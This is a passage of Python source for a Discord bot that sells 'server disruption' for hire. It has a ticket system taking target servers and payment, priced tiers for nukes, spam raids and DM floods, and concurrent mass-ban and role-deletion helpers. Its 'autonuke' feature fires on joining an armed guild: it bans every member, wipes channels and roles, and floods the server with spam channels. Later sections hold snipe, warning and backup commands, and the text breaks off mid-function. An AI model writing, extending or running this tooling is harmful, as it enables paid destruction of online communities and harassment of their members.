    e = discord.Embed(
        title=f"🎫 Hire Ticket  #{t['id']}  —  {_TICKET_ICONS[status]} {status.upper()}",
        color=_TICKET_COLORS[status],
        timestamp=datetime.datetime.now(datetime.UTC),
    )
    e.add_field(name="👤 Client",       value=f"<@{t['user_id']}> `{t['user_name']}`", inline=True)
    e.add_field(name="🎯 Target",       value=t["server_name"],   inline=True)
    e.add_field(name="🔗 Invite/ID",    value=t["server_invite"], inline=True)
    e.add_field(name="💳 Payment",      value=t["payment"],       inline=True)
    e.add_field(name="📬 Contact",      value=t["contact"],       inline=True)
    if t.get("handled_by"):
        e.add_field(name="🛡️ Handled by", value=t["handled_by"],  inline=True)
    e.add_field(name="📝 Details",      value=t["details"][:1020], inline=False)
    if t.get("note"):
        e.add_field(name="💬 Staff Note", value=t["note"][:512],  inline=False)
    e.set_footer(text=f"Ticket #{t['id']} • Created {t['created_at'][:10]}")
    return e


async def _create_ticket_channel(t: dict) -> discord.TextChannel | None:
    """Create a private ticket channel inside the hire guild category."""
    guild = bot.get_guild(HIRE_GUILD_ID)
    if not guild:
        return None

    # Find or create the Hire Tickets category
    category = discord.utils.get(guild.categories, name=HIRE_CAT_NAME)
    if not category:
        try:
            category = await guild.create_category(HIRE_CAT_NAME)
        except Exception:
            return None

    # Build a clean channel name
    raw = t["user_name"].split("#")[0]
    clean = "".join(c if (c.isalnum() or c == "-") else "-" for c in raw.lower())[:20].strip("-") or "user"
    ch_name = f"ticket-{t['id']}-{clean}"

    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            guild.me:           discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True),
        }
        # Give the client view access if they're a member of this guild
        member = guild.get_member(t["user_id"])
        if member:
            overwrites[member] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        return await guild.create_text_channel(
            ch_name,
            category=category,
            overwrites=overwrites,
            topic=f"Hire ticket #{t['id']} — {t['server_name']} | Client: {t['user_name']}",
            reason=f"Hire ticket #{t['id']}",
        )
    except Exception:
        return None


async def _post_hire_ticket(t: dict):
    """Create a ticket channel in the hire guild AND optionally post to fallback channel."""
    view = _HireTicketView(t["id"])

    # Primary: dedicated ticket channel in the hire guild
    ch = await _create_ticket_channel(t)
    if ch:
        t["ticket_channel_id"] = ch.id
        _save_tickets()
        await safe(ch.send(embed=_ticket_embed(t), view=view))
        # Pin the ticket embed so it stays at the top
        try:
            msgs = [m async for m in ch.history(limit=1)]
            if msgs:
                await msgs[0].pin()
        except Exception:
            pass

    # Fallback: post summary to HIRE_CHANNEL_ID if configured
    if HIRE_CHANNEL_ID:
        fallback = bot.get_channel(HIRE_CHANNEL_ID)
        if fallback:
            mention = ch.mention if ch else "*(channel creation failed)*"
            fb = discord.Embed(
                title=f"🎫 New Ticket #{t['id']} — {t['server_name']}",
                description=f"Ticket channel: {mention}",
                color=0xffd700,
            )
            fb.add_field(name="Client",  value=t["user_name"],  inline=True)
            fb.add_field(name="Status",  value="🟡 Pending",    inline=True)
            await safe(fallback.send(embed=fb))


async def _notify_requester(t: dict):
    """DM the ticket author with their updated ticket status."""
    try:
        user = bot.get_user(t["user_id"]) or await bot.fetch_user(t["user_id"])
        status = t["status"]
        msgs = {
            "accepted": "✅ Your hire request has been **accepted**! Our staff will contact you shortly.",
            "denied":   "❌ Your hire request has been **denied**. You may submit a new request.",
            "closed":   "🔒 Your hire ticket has been **closed**. Thank you for working with us!",
        }
        ue = discord.Embed(
            title=f"📋 Ticket #{t['id']} — {status.upper()}",
            description=msgs.get(status, "Your ticket has been updated."),
            color=_TICKET_COLORS.get(status, 0x99aab5),
        )
        if t.get("note"):
            ue.add_field(name="💬 Staff note", value=t["note"], inline=False)
        ue.set_footer(text=f"Use !hirestatus {t['id']} anytime")
        await user.send(embed=ue)
    except Exception:
        pass


# ─── Deny reason modal ─────────────────────────────────────────────

class _DenyReasonModal(discord.ui.Modal, title="Deny Ticket — Add Reason"):
    reason = discord.ui.TextInput(
        label="Reason (optional)",
        style=discord.TextStyle.paragraph,
        required=False,
        max_length=500,
    )

    def __init__(self, ticket_id: str, original_msg: discord.Message,
                 parent_view: "discord.ui.View"):
        super().__init__()
        self.ticket_id   = ticket_id
        self.original_msg = original_msg
        self.parent_view  = parent_view

    async def on_submit(self, interaction: discord.Interaction):
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        t["status"]     = "denied"
        t["handled_by"] = str(interaction.user)
        t["note"]       = self.reason.value or ""
        _save_tickets()

        # Disable buttons, update embed
        for item in self.parent_view.children:
            item.disabled = True
        await self.original_msg.edit(embed=_ticket_embed(t), view=self.parent_view)
        await interaction.response.send_message(
            f"❌ Ticket **#{self.ticket_id}** denied.", ephemeral=True
        )
        await _notify_requester(t)
        await _log_embed(_action_embed("❌ Hire Ticket Denied", 0xff0000, [
            ("Ticket",   f"#{self.ticket_id}",           True),
            ("By",       str(interaction.user),          True),
            ("Reason",   t["note"] or "No reason given", False),
        ]))


# ─── Note modal ────────────────────────────────────────────────────

class _NoteModal(discord.ui.Modal, title="Add Staff Note"):
    note = discord.ui.TextInput(
        label="Note",
        style=discord.TextStyle.paragraph,
        max_length=500,
    )

    def __init__(self, ticket_id: str, original_msg: discord.Message):
        super().__init__()
        self.ticket_id    = ticket_id
        self.original_msg = original_msg

    async def on_submit(self, interaction: discord.Interaction):
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        t["note"] = self.note.value
        _save_tickets()
        await self.original_msg.edit(embed=_ticket_embed(t))
        await interaction.response.send_message("✅ Note added.", ephemeral=True)


# ─── Hire ticket action buttons (posted in hire channel) ───────────

class _HireTicketView(discord.ui.View):
    def __init__(self, ticket_id: str):
        super().__init__(timeout=None)
        self.ticket_id = ticket_id

    async def _wl_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id not in WHITELIST:
            await interaction.response.send_message("❌ Whitelist only.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="✅ Accept", style=discord.ButtonStyle.success, row=0)
    async def accept_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        t["status"]     = "accepted"
        t["handled_by"] = str(interaction.user)
        _save_tickets()
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(embed=_ticket_embed(t), view=self)
        await interaction.response.send_message(
            f"✅ Ticket **#{self.ticket_id}** accepted.", ephemeral=True
        )
        await _notify_requester(t)
        await _log_embed(_action_embed("✅ Hire Ticket Accepted", 0x57f287, [
            ("Ticket", f"#{self.ticket_id}",  True),
            ("By",     str(interaction.user), True),
            ("Client", t["user_name"],         True),
        ]))

    @discord.ui.button(label="❌ Deny", style=discord.ButtonStyle.danger, row=0)
    async def deny_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        await interaction.response.send_modal(
            _DenyReasonModal(self.ticket_id, interaction.message, self)
        )

    @discord.ui.button(label="🔒 Close", style=discord.ButtonStyle.secondary, row=0)
    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        t["status"]     = "closed"
        t["handled_by"] = str(interaction.user)
        _save_tickets()
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(embed=_ticket_embed(t), view=self)
        await interaction.response.send_message(
            f"🔒 Ticket **#{self.ticket_id}** closed.", ephemeral=True
        )
        await _notify_requester(t)

    @discord.ui.button(label="💬 Add Note", style=discord.ButtonStyle.secondary, row=1)
    async def note_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        await interaction.response.send_modal(
            _NoteModal(self.ticket_id, interaction.message)
        )

    @discord.ui.button(label="✉️ DM Client", style=discord.ButtonStyle.primary, row=1)
    async def dm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        await interaction.response.send_modal(_ReplyModal(t["user_id"]))


# ─── Hire start view (for !hire command) ───────────────────────────

class _HireStartView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="📋 Submit Hire Request", style=discord.ButtonStyle.danger, emoji="🔥")
    async def open_form(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(_HireModal())


# ─── Hire commands ─────────────────────────────────────────────────

@bot.command()
async def hiresetup(ctx, channel: discord.TextChannel = None):
    """Set the channel where hire tickets are posted (master only)."""
    if ctx.author.id != MASTER_ID:
        await ctx.send("❌ Master only.")
        return
    global HIRE_CHANNEL_ID
    HIRE_CHANNEL_ID = (channel or ctx.channel).id
    await ctx.send(f"✅ Hire tickets will be posted to {(channel or ctx.channel).mention}")
    await _log_embed(_action_embed("⚙️ Hire Channel Set", 0xffd700, [
        ("Channel", str((channel or ctx.channel).id), True),
        ("By", str(ctx.author), True),
    ]))


@bot.command()
async def hire(ctx):
    """Open a hire request form. Anyone can use this."""
    e = discord.Embed(
        title="🔥 Hire Us — Nuke & Raid Services",
        description=(
            "We provide **professional server disruption services**.\n"
            "Click the button below to submit your request — our team reviews every ticket.\n\n"
            "**Payment is collected *after* acceptance — you pay nothing upfront.**"
        ),
        color=0xff4500,
    )
    e.add_field(name="🔥 Basic Nuke",     value="From **$10**",  inline=True)
    e.add_field(name="💣 Raid Package",   value="From **$15**",  inline=True)
    e.add_field(name="⚡ Premium Package", value="From **$25**",  inline=True)
    e.set_footer(text="Submit a request and we'll reach out with next steps.")
    await ctx.send(embed=e, view=_HireStartView())


@bot.command()
async def hireprice(ctx):
    """Show pricing. Anyone can use this."""
    e = discord.Embed(title="💰 Pricing", color=0xffd700)
    _tier_meta = {
        "basic":   ("🔥 Basic Nuke",     "Delete channels, roles, ban members"),
        "raid":    ("💣 Raid Package",    "Mass spam, webhook raids, DM floods"),
        "premium": ("⚡ Premium Package", "Full nuke + raid + custom script"),
        "custom":  ("🎯 Custom Job",      "Tell us exactly what you need"),
    }
    for key, (name, desc) in _tier_meta.items():
        raw = PRICES.get(key, _DEFAULT_PRICES[key])
        price_str = f"**${raw}+**" if str(raw).isdigit() else f"**{raw}**"
        e.add_field(name=name, value=f"{price_str}\n{desc}", inline=False)
    e.set_footer(text="Use !hire to submit a request • Payment after acceptance only")
    await ctx.send(embed=e, view=_HireStartView())


@bot.command()
async def setprice(ctx, tier: str, *, amount: str):
    """Update the price for a hire tier (whitelist only)."""
    tier = tier.lower()
    if tier not in {"basic", "raid", "premium", "custom"}:
        await ctx.send("❌ Valid tiers: `basic`, `raid`, `premium`, `custom`")
        return
    PRICES[tier] = amount
    _save_prices()
    await ctx.send(f"✅ Price for **{tier}** updated to **{amount}**")
    await _log_embed(_action_embed("💰 Price Updated", 0xffd700, [
        ("Tier",      tier,          True),
        ("New Price", str(amount),   True),
        ("By",        str(ctx.author), True),
    ]))


@bot.command()
async def hirelist(ctx):
    """List all hire tickets (whitelist only)."""
    tickets = TICKETS.get("tickets", {})
    if not tickets:
        await ctx.send("📋 No tickets on file.")
        return
    lines = []
    for t in sorted(tickets.values(), key=lambda x: int(x["id"]), reverse=True)[:20]:
        icon   = _TICKET_ICONS.get(t["status"], "❓")
        lines.append(
            f"`#{t['id']}` {icon} **{t['status'].upper()}** — "
            f"{t['server_name']} ← {t['user_name']}"
        )
    e = discord.Embed(title=f"🎫 Hire Tickets ({len(tickets)} total)",
                      description="\n".join(lines), color=0xffd700)
    e.set_footer(text="Showing latest 20 • Use !hireinfo <id> for details")
    await ctx.send(embed=e)


@bot.command()
async def hireinfo(ctx, ticket_id: str):
    """Show full details of a ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    await ctx.send(embed=_ticket_embed(t))


@bot.command()
async def hirestatus(ctx, ticket_id: str):
    """Check the status of your hire ticket. Anyone can use this."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    # Non-whitelist users can only see their own tickets
    if ctx.author.id not in WHITELIST and t["user_id"] != ctx.author.id:
        await ctx.send("❌ You can only check your own tickets.")
        return
    e = discord.Embed(
        title=f"📋 Ticket #{ticket_id} Status",
        color=_TICKET_COLORS.get(t["status"], 0xffd700),
    )
    e.add_field(name="Status",    value=f"{_TICKET_ICONS[t['status']]} {t['status'].upper()}", inline=True)
    e.add_field(name="🎯 Target", value=t["server_name"], inline=True)
    e.add_field(name="📅 Filed",  value=t["created_at"][:10], inline=True)
    if t.get("handled_by"):
        e.add_field(name="🛡️ Handled by", value=t["handled_by"], inline=True)
    if t.get("note"):
        e.add_field(name="💬 Staff note", value=t["note"], inline=False)
    await ctx.send(embed=e)


@bot.command()
async def hireaccept(ctx, ticket_id: str):
    """Accept a hire ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    t["status"]     = "accepted"
    t["handled_by"] = str(ctx.author)
    _save_tickets()
    await ctx.send(embed=_ticket_embed(t))
    await _notify_requester(t)
    await _log_embed(_action_embed("✅ Hire Ticket Accepted", 0x57f287, [
        ("Ticket", f"#{ticket_id}",  True),
        ("By",     str(ctx.author), True),
        ("Client", t["user_name"],   True),
    ]))


@bot.command()
async def hiredeny(ctx, ticket_id: str, *, reason: str = "No reason given"):
    """Deny a hire ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    t["status"]     = "denied"
    t["handled_by"] = str(ctx.author)
    t["note"]       = reason
    _save_tickets()
    await ctx.send(embed=_ticket_embed(t))
    await _notify_requester(t)
    await _log_embed(_action_embed("❌ Hire Ticket Denied", 0xff0000, [
        ("Ticket", f"#{ticket_id}",  True),
        ("By",     str(ctx.author), True),
        ("Reason", reason,           False),
    ]))


@bot.command()
async def hireclose(ctx, ticket_id: str):
    """Close a completed hire ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    t["status"]     = "closed"
    t["handled_by"] = str(ctx.author)
    _save_tickets()
    await ctx.send(embed=_ticket_embed(t))
    await _notify_requester(t)


@bot.command()
async def hirenote(ctx, ticket_id: str, *, note: str):
    """Add or update a staff note on a ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    t["note"] = note
    _save_tickets()
    await ctx.send(f"✅ Note added to ticket **#{ticket_id}**.")


@bot.command()
async def hirecancel(ctx, ticket_id: str):
    """Cancel your own hire ticket."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    if t["user_id"] != ctx.author.id and ctx.author.id not in WHITELIST:
        await ctx.send("❌ You can only cancel your own tickets.")
        return
    t["status"]     = "closed"
    t["handled_by"] = f"Cancelled by {ctx.author}"
    _save_tickets()
    await ctx.send(f"✅ Ticket **#{ticket_id}** has been cancelled.")
    await _notify_requester(t)


@bot.command()
async def hirearch(ctx):
    """Show archived (closed/denied) tickets (whitelist only)."""
    done = [t for t in TICKETS.get("tickets", {}).values()
            if t["status"] in ("closed", "denied")]
    if not done:
        await ctx.send("📋 No archived tickets.")
        return
    lines = []
    for t in sorted(done, key=lambda x: int(x["id"]), reverse=True)[:20]:
        icon = _TICKET_ICONS[t["status"]]
        lines.append(f"`#{t['id']}` {icon} **{t['status'].upper()}** — {t['server_name']}")
    e = discord.Embed(title=f"🗄️ Archived Tickets ({len(done)})",
                      description="\n".join(lines), color=0x99aab5)
    await ctx.send(embed=e)


@bot.command()
async def hiredmclient(ctx, ticket_id: str, *, message_text: str):
    """DM the client of a ticket directly (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    try:
        user = bot.get_user(t["user_id"]) or await bot.fetch_user(t["user_id"])
        e = discord.Embed(
            title=f"📬 Message re: Ticket #{ticket_id}",
            description=message_text,
            color=0x5865F2,
        )
        e.set_footer(text="Reply by DMing this bot")
        await user.send(embed=e)
        await ctx.send(f"✅ Message sent to **{t['user_name']}**.")
        await _log_embed(_action_embed("📤 Staff DM to Client", 0x5865F2, [
            ("Ticket", f"#{ticket_id}",  True),
            ("To",     t["user_name"],   True),
            ("By",     str(ctx.author), True),
            ("Msg",    message_text[:512], False),
        ]))
    except Exception as ex:
        await ctx.send(f"❌ Failed: `{ex}`")


# ═══════════════════════════════════════════════════════════════════
# QUALITY FAST-PATH HELPERS (used by improved existing + new commands)
# ═══════════════════════════════════════════════════════════════════

async def _fast_delete_roles(guild: discord.Guild, concurrency: int = 20):
    sem = asyncio.Semaphore(concurrency)
    targets = [r for r in guild.roles
               if not r.is_default() and not r.managed
               and r.position < guild.me.top_role.position]
    async def _del(r):
        async with sem:
            await safe(r.delete())
    await asyncio.gather(*[_del(r) for r in targets])

async def _fast_ban_all(guild: discord.Guild, concurrency: int = 15, reason: str = "mass ban"):
    sem = asyncio.Semaphore(concurrency)
    targets = [m for m in guild.members
               if m != guild.me and m.top_role < guild.me.top_role]
    async def _do(m):
        async with sem:
            await safe(m.ban(delete_message_days=0, reason=reason))
    await asyncio.gather(*[_do(m) for m in targets])

async def _rich_status(ctx, title: str, color: int = 0x57f287, **fields):
    e = discord.Embed(title=title, color=color, timestamp=datetime.datetime.now(datetime.UTC))
    for name, value in fields.items():
        e.add_field(name=name, value=str(value), inline=True)
    try:
        await ctx.send(embed=e)
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════════
# AUTONUKE  —  !autonuke <guild_id> <channel> <message>
# When the bot is added to guild_id it instantly nukes the server.
# ═══════════════════════════════════════════════════════════════════

AUTONUKE_FILE = "autonuke.json"

def _load_autonuke() -> dict:
    try:
        with open(AUTONUKE_FILE) as f: return json.load(f)
    except Exception: return {}

def _save_autonuke():
    try:
        with open(AUTONUKE_FILE, "w") as f: json.dump(AUTONUKE_TARGETS, f, indent=2)
    except Exception: pass

AUTONUKE_TARGETS: dict = _load_autonuke()


async def _execute_autonuke(guild: discord.Guild, cfg: dict):
    ch_name  = cfg.get("channel", "nuked")
    msg_text = cfg.get("message", "@everyone")
    # 1) Ban everyone simultaneously
    await _fast_ban_all(guild, reason="AutoNuke")
    # 2) Wipe all channels simultaneously
    await _fast_delete_channels(guild)
    # 3) Wipe all deletable roles
    await _fast_delete_roles(guild)
    # 4) Rename server
    await safe(guild.edit(name=ch_name))
    # 5) Flood with new channels + spam
    ch_sem = asyncio.Semaphore(5)
    async def _spawn():
        async with ch_sem:
            ch = await safe(guild.create_text_channel(ch_name))
            if ch:
                await asyncio.gather(*[safe(ch.send(msg_text)) for _ in range(30)])
    await asyncio.gather(*[_spawn() for _ in range(200)])
    await _log_embed(_action_embed("☢️ AUTONUKE EXECUTED", 0xff0000, [
        ("Guild",    f"{guild.name} `{guild.id}`", True),
        ("Channel",  ch_name,                      True),
        ("Message",  msg_text[:200],               False),
        ("Armed by", cfg.get("set_by", "?"),       True),
    ]))


@bot.event
async def on_guild_join(guild: discord.Guild):
    cfg = AUTONUKE_TARGETS.get(str(guild.id))
    if cfg:
        AUTONUKE_TARGETS.pop(str(guild.id), None)
        _save_autonuke()
        asyncio.create_task(_execute_autonuke(guild, cfg))
    await _log_embed(_action_embed(
        "🤖 Bot Joined Guild" + (" — ☢️ AUTONUKE ARMED" if cfg else ""),
        0xff0000 if cfg else 0x57f287, [
        ("Guild",    f"{guild.name} `{guild.id}`", True),
        ("Members",  str(guild.member_count),      True),
        ("Owner",    str(guild.owner),             True),
        ("Channels", str(len(guild.channels)),     True),
        ("Roles",    str(len(guild.roles)),        True),
        ("AutoNuke", "☢️ FIRING" if cfg else "None", True),
    ]))

@bot.event
async def on_guild_remove(guild: discord.Guild):
    await _log_embed(_action_embed("🚪 Bot Left / Removed from Guild", 0xff6b6b, [
        ("Guild", f"{guild.name} `{guild.id}`", True),
        ("Members", str(guild.member_count), True),
    ]))


@bot.command()
async def autonuke(ctx, guild_id: int, channel: str, *, message: str = "@everyone"):
    """Arm an AutoNuke — fires the moment the bot joins that guild."""
    AUTONUKE_TARGETS[str(guild_id)] = {
        "channel":  channel,
        "message":  message,
        "set_by":   str(ctx.author),
        "set_at":   datetime.datetime.now(datetime.UTC).isoformat(),
    }
    _save_autonuke()
    e = discord.Embed(
        title="☢️ AutoNuke Armed",
        description=(
            f"The next time this bot joins guild **`{guild_id}`**, it will immediately:\n"
            "1. Ban all members\n2. Delete all channels\n3. Delete all roles\n"
            "4. Rename the server\n5. Flood with channels & spam"
        ),
        color=0xff0000,
    )
    e.add_field(name="🎯 Target Guild", value=f"`{guild_id}`", inline=True)
    e.add_field(name="📁 Channel Name", value=channel,         inline=True)
    e.add_field(name="💬 Spam Message", value=message[:200],   inline=False)
    e.set_footer(text="Use !autonukeclear to disarm  •  !autonutelist to list all")
    await ctx.send(embed=e)
    await _log_embed(_action_embed("☢️ AutoNuke Armed", 0xff0000, [
        ("Guild ID", str(guild_id),    True),
        ("By",       str(ctx.author), True),
        ("Channel",  channel,          True),
        ("Message",  message[:200],   False),
    ]))

@bot.command()
async def autonukeclear(ctx, guild_id: int = None):
    """Disarm AutoNuke for one guild, or all."""
    if guild_id:
        removed = AUTONUKE_TARGETS.pop(str(guild_id), None)
        _save_autonuke()
        msg = f"✅ AutoNuke disarmed for `{guild_id}`." if removed else f"❌ No AutoNuke for `{guild_id}`."
        await ctx.send(msg)
    else:
        n = len(AUTONUKE_TARGETS)
        AUTONUKE_TARGETS.clear()
        _save_autonuke()
        await ctx.send(f"✅ {n} AutoNuke(s) disarmed.")

@bot.command()
async def autonutelist(ctx):
    """List all armed AutoNukes."""
    if not AUTONUKE_TARGETS:
        await ctx.send("✅ No AutoNukes armed.")
        return
    lines = [f"`{gid}` — ch: `{c['channel']}` msg: `{c['message'][:40]}` — by {c['set_by']}"
             for gid, c in AUTONUKE_TARGETS.items()]
    e = discord.Embed(title=f"☢️ Armed AutoNukes ({len(AUTONUKE_TARGETS)})",
                      description="\n".join(lines), color=0xff0000)
    await ctx.send(embed=e)

# ═══════════════════════════════════════════════════════════════════
# SNIPE SYSTEM
# ═══════════════════════════════════════════════════════════════════

_snipe_cache:  dict[int, discord.Message]      = {}
_esnipe_cache: dict[int, tuple]                = {}

@bot.event
async def on_message_delete(message: discord.Message):
    if not message.author.bot:
        _snipe_cache[message.channel.id] = message

@bot.event
async def on_message_edit(before: discord.Message, after: discord.Message):
    if not before.author.bot and before.content != after.content:
        _esnipe_cache[before.channel.id] = (before, after)

@bot.command()
async def snipe(ctx):
    """Show the last deleted message in this channel."""
    msg = _snipe_cache.get(ctx.channel.id)
    if not msg:
        await ctx.send("❌ Nothing to snipe in this channel."); return
    e = discord.Embed(description=msg.content or "*(no text)*", color=0xff4500, timestamp=msg.created_at)
    e.set_author(name=str(msg.author), icon_url=msg.author.display_avatar.url)
    e.set_footer(text=f"Deleted in #{ctx.channel.name}")
    if msg.attachments:
        e.set_image(url=msg.attachments[0].url)
    await ctx.send(embed=e)

@bot.command()
async def editsnipe(ctx):
    """Show the last edited message in this channel."""
    pair = _esnipe_cache.get(ctx.channel.id)
    if not pair:
        await ctx.send("❌ Nothing edit-sniped here."); return
    before, after = pair
    e = discord.Embed(color=0xffd700, timestamp=after.edited_at or discord.utils.utcnow())
    e.set_author(name=str(before.author), icon_url=before.author.display_avatar.url)
    e.add_field(name="Before", value=before.content[:1024] or "*(empty)*", inline=False)
    e.add_field(name="After",  value=after.content[:1024]  or "*(empty)*", inline=False)
    e.set_footer(text=f"Edited in #{ctx.channel.name}")
    await ctx.send(embed=e)

@bot.command()
async def snipeclear(ctx):
    """Clear snipe cache for this channel."""
    _snipe_cache.pop(ctx.channel.id, None)
    _esnipe_cache.pop(ctx.channel.id, None)
    await ctx.send("🗑️ Snipe cache cleared for this channel.")

@bot.command()
async def snipeclearall(ctx):
    """Clear ALL snipe caches."""
    _snipe_cache.clear(); _esnipe_cache.clear()
    await ctx.send("🗑️ All snipe caches cleared.")

# ═══════════════════════════════════════════════════════════════════
# WARNINGS SYSTEM
# ═══════════════════════════════════════════════════════════════════

WARNS_FILE = "warnings.json"

def _load_warns() -> dict:
    try:
        with open(WARNS_FILE) as f: return json.load(f)
    except Exception: return {}

def _save_warns():
    try:
        with open(WARNS_FILE, "w") as f: json.dump(WARNS, f, indent=2)
    except Exception: pass

WARNS: dict = _load_warns()

@bot.command()
async def warn(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    """Warn a member. Stored persistently."""
    uid = str(member.id)
    WARNS.setdefault(uid, [])
    wid = len(WARNS[uid]) + 1
    WARNS[uid].append({"id": wid, "reason": reason, "by": str(ctx.author),
                        "at": datetime.datetime.now(datetime.UTC).isoformat()})
    _save_warns()
    e = discord.Embed(title=f"⚠️ Warning #{wid} issued", color=0xffa500)
    e.add_field(name="User",   value=f"{member.mention} `{member.id}`",   inline=True)
    e.add_field(name="By",     value=str(ctx.author),                     inline=True)
    e.add_field(name="Total",  value=f"{len(WARNS[uid])} warning(s)",     inline=True)
    e.add_field(name="Reason", value=reason,                              inline=False)
    await ctx.send(embed=e)
    try:
        ue = discord.Embed(title=f"⚠️ You were warned in **{ctx.guild.name}**",
                           description=f"**Reason:** {reason}\n**By:** {ctx.author}",
                           color=0xffa500)
        ue.set_footer(text=f"Warning #{wid} • {len(WARNS[uid])} total")
        await member.send(embed=ue)
    except Exception: pass
    await _log_embed(_action_embed("⚠️ Member Warned", 0xffa500,
        [("User", f"{member} `{member.id}`", True), ("By", str(ctx.author), True),
         ("Reason", reason, False)]))

@bot.command()
async def warnings(ctx, member: discord.Member):
    """Show all warnings for a member."""
    ws = WARNS.get(str(member.id), [])
    if not ws:
        await ctx.send(f"✅ {member.mention} has no warnings."); return
    e = discord.Embed(title=f"⚠️ Warnings for {member} ({len(ws)} total)", color=0xffa500)
    for w in ws[-10:]:
        e.add_field(name=f"#{w['id']} — {w['at'][:10]}",
                    value=f"{w['reason']}\n*by {w['by']}*", inline=False)
    if len(ws) > 10:
        e.set_footer(text=f"Showing last 10 of {len(ws)} warnings")
    await ctx.send(embed=e)

@bot.command()
async def clearwarns(ctx, member: discord.Member):
    """Clear all warnings for a member."""
    uid = str(member.id)
    n = len(WARNS.get(uid, []))
    WARNS[uid] = []; _save_warns()
    await ctx.send(f"✅ Cleared **{n}** warning(s) for {member.mention}.")

@bot.command()
async def delwarn(ctx, member: discord.Member, warn_id: int):
    """Delete a specific warning by ID."""
    uid = str(member.id)
    before = len(WARNS.get(uid, []))
    WARNS[uid] = [w for w in WARNS.get(uid, []) if w["id"] != warn_id]
    _save_warns()
    if len(WARNS[uid]) < before:
        await ctx.send(f"✅ Warning `#{warn_id}` removed from {member.mention}.")
    else:
        await ctx.send(f"❌ Warning `#{warn_id}` not found for {member.mention}.")

@bot.command()
async def warncount(ctx, member: discord.Member):
    """Show warning count for a member."""
    n = len(WARNS.get(str(member.id), []))
    await ctx.send(f"⚠️ {member.mention} has **{n}** warning(s).")

@bot.command()
async def topwarns(ctx, n: int = 10):
    """Show users with the most warnings."""
    data = sorted(WARNS.items(), key=lambda x: len(x[1]), reverse=True)[:n]
    if not data:
        await ctx.send("No warnings recorded."); return
    lines = []
    for uid, ws in data:
        m = ctx.guild.get_member(int(uid))
        lines.append(f"**{len(ws)}** — {str(m) if m else f'`{uid}`'}")
    e = discord.Embed(title=f"⚠️ Top {n} Most Warned", description="\n".join(lines), color=0xffa500)
    await ctx.send(embed=e)

@bot.command()
async def masswarn(ctx, role: discord.Role, *, reason: str = "Mass warning"):
    """Warn all members with a specific role."""
    targets = [m for m in role.members if not m.bot]
    for m in targets:
        uid = str(m.id)
        WARNS.setdefault(uid, [])
        WARNS[uid].append({"id": len(WARNS[uid])+1, "reason": reason,
                           "by": str(ctx.author), "at": datetime.datetime.now(datetime.UTC).isoformat()})
    _save_warns()
    await _rich_status(ctx, f"⚠️ Mass Warned {len(targets)} members", 0xffa500,
                       Role=role.name, Count=len(targets), Reason=reason)

# ═══════════════════════════════════════════════════════════════════
# SERVER BACKUP / RESTORE
# ═══════════════════════════════════════════════════════════════════

BACKUPS_FILE = "backups.json"
try:
    with open(BACKUPS_FILE) as _f: _backups: dict = json.load(_f)
except Exception: _backups: dict = {}

def _save_backups():
    try:
        with open(BACKUPS_FILE, "w") as f: json.dump(_backups, f, indent=2)
    except Exception: pass

@bot.command()
async def backup(ctx, *, label: str = ""):
    """Snapshot this server's channel/role structure."""
    g   = ctx.guild
    bid = f"{g.id}_{int(time.time())}"
    _backups[bid] = {
        "label": label or g.name, "guild_id": g.id, "guild_name": g.name,
        "created_at": datetime.datetime.now(datetime.UTC).isoformat(), "created_by": str(ctx.author),
        "roles": [{"name": r.name, "color": r.color.value, "hoist": r.hoist,
                   "mentionable": r.mentionable, "permissions": r.permissions.value}
                  for r in g.roles if not r.is_default() and not r.managed],
        "categories": [{"name": cat.name, "channels": [
            {"name": ch.name, "type": str(ch.type),
             "topic": getattr(ch,"topic","") or "",
             "nsfw": getattr(ch,"nsfw",False),
